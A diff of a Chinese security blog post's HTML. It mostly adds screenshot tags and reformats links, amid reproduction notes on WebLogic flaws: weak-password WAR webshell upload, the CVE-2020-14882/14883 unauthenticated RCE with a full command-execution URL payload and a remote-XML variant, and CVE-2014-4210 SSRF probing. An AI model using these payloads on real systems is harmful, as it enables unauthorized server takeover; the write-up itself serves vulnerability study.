@@ -365,30 +365,30 @@
 <p>注意一下不能使用 bp 抓包去爆破，错误密码5次之后就会自动锁定</p>
 <p>这一个弱口令可以和任意文件上传漏洞联合起来打</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先使用弱口令登录，点击部署下的安装</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/deployAndInstall.png" class>
 
 <p>选择“上载文件”</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/uploadFile.png" class>
 
 <p>上传恶意的 war 包，这个恶意 war 包是由冰蝎生成，压缩为 zip 之后，将后缀名改为 .war 的</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/EvilWarBag.png" class>
 
 <p>继续默认点击位于上方的下一步，直至遇到并点击完成</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/doneUpload.png" class>
 
 <p>接着，启动我们之前部署的恶意 war 包</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/goEvilWar.png" class>
 
 <p>选择 “为所有请求提供服务”</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/requestProvide.png" class>
 
 <p>正常启动之后，如下：</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/StartedOver.png" class>
 
 <p>成功 getshell</p>
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/ping.png" class>
 
-
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/pingSuccess.png" class>
 
 <h2 id="0x04-CVE-2020-14882-x2F-CVE-2020-14883-未授权-RCE"><a href="#0x04-CVE-2020-14882-x2F-CVE-2020-14883-未授权-RCE" class="headerlink" title="0x04 CVE-2020-14882&#x2F;CVE-2020-14883 未授权 RCE"></a>0x04 CVE-2020-14882&#x2F;CVE-2020-14883 未授权 RCE</h2><p>先聊一聊未授权，后面再讲 RCE</p>
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</p>
@@ -398,17 +398,17 @@
 </ul>
 <h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主要是以下两个 CVE 的组合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现 RCE。</p>
 <h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p>正常情况下，没有登录 WebLogic 的话访问 console 后台就会直接 302 跳转到 <code>/console/login/LoginForm.jsp</code> 登录界面。</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/Redirct302.png" class>
 
 <p>但是，通过目录穿越结合双重 URL 编码就能绕过认证实现未授权访问 console 后台：</p>
 <p>对应的 payload 为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/bypassCSS.png" class>
 
 <p>其中 <code>%252e%252e%252f</code> 为二次 url 编码的 <code>../</code> ，通过这个就可以实现穿越路径未授权访问相关管理后台。</p>
 <p>访问后台后，发现和之前复现的弱密码登陆的页面不一样，之前的通过弱密码登陆管理员账号的界面有部署功能：</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/noPrevilige.png" class>
 
 <p>这时候就需要用到后台任意命令执行（CVE-2020-14883）了。</p>
 <h4 id="CVE-2020-14883-1"><a href="#CVE-2020-14883-1" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p>前面的 CVE 虽然可以访问后台，但是是低权限用户、无法安装应用，此处我们需要借助 CVE-2020-14883</p>
@@ -423,7 +423,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br></pre></td></tr></table></figure>
 
 <p>执行的命令添加在 http 头部的 cmd 字段：</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/withPayload.png" class>
 
 <h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</span><br></pre></td></tr></table></figure>
 
@@ -434,7 +434,7 @@
 <p>如果是 windows 可以尝试弹计算器，然后通过如下 URL，即可让 Weblogic 加载这个 XML，并执行其中的命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/XMLCalc.png" class>
 
 <p>但是该方法需要 Weblogic 的服务器能够访问到恶意 XML，在服务器不出网的时候无法利用。</p>
 <h2 id="0x05-CVE-2014-4210-SSRF"><a href="#0x05-CVE-2014-4210-SSRF" class="headerlink" title="0x05 CVE-2014-4210 SSRF"></a>0x05 CVE-2014-4210 SSRF</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
@@ -442,7 +442,7 @@
 </ul>
 <h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic 的 <code>SearchPublicReqistries.jsp</code> 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p>
 <p>漏洞代码如下，是比较容易看懂的</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/SSRFOrigin.png" class>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>SSRF 漏洞存在于 <code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如 <code>http://127.0.0.1:7001</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>
@@ -450,10 +450,10 @@
 <p>探测 7001 端口结果如下，错误信息是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &amp;#40;Not Found&amp;#41;.  Please ensure that your URL is correct, and the web service has deployed without error.</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/Detect7001.png" class>
 
 <p>探测 7000 端口结果如下</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/error3306.png" class>
 
 <ul>
 <li>此时的错误信息是</li>
@@ -475,11 +475,11 @@
 <h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>weblogic如果开启了web服务测试页（默认不开启），则分别会在&#x2F;ws_utc&#x2F;begin.do以及&#x2F;ws_utc&#x2F;config.do这两个页面存在任意上传getshell漏洞</p>
 <p>由于该设置默认不开启，所以此漏洞有一定的局限性</p>
 <h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>登录上 console，点 <code>base_domain</code>，在 “配置” -&gt; “一般信息” -&gt; “高级” 中开启 “启用 Web 服务测试页” 选项</p>
-
+<img src="/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/domainFirst.png" class>
 
 <p>我这里环境没跑起来，没发现存在 Web 服务检测页，有兴趣的师傅可以看一下 johnFord 师傅的文章</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/" >https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/01/WebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4getshell/" >WebLogic弱口令getshell [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/01/%E6%B5%85%E6%9E%90Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2018-2894%EF%BC%89/" >浅析WebLogic任意文件上传（CVE-2018-2894） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-SSRF%EF%BC%88CVE-2014-4210%EF%BC%89/" >浅析WebLogic SSRF（CVE-2014-4210） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic%E6%9C%AA%E6%8E%88%E6%9D%83RCE%EF%BC%88CVE-2020-14882-CVE-2020-14883%EF%BC%89/" >浅析WebLogic未授权RCE（CVE-2020-14882&#x2F;CVE-2020-14883） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/" >https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/">https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/01/WebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4getshell/">WebLogic弱口令getshell [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/01/%E6%B5%85%E6%9E%90Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2018-2894%EF%BC%89/">浅析WebLogic任意文件上传（CVE-2018-2894） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-SSRF%EF%BC%88CVE-2014-4210%EF%BC%89/">浅析WebLogic SSRF（CVE-2014-4210） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic%E6%9C%AA%E6%8E%88%E6%9D%83RCE%EF%BC%88CVE-2020-14882-CVE-2020-14883%EF%BC%89/">浅析WebLogic未授权RCE（CVE-2020-14882&#x2F;CVE-2020-14883） [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/">https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
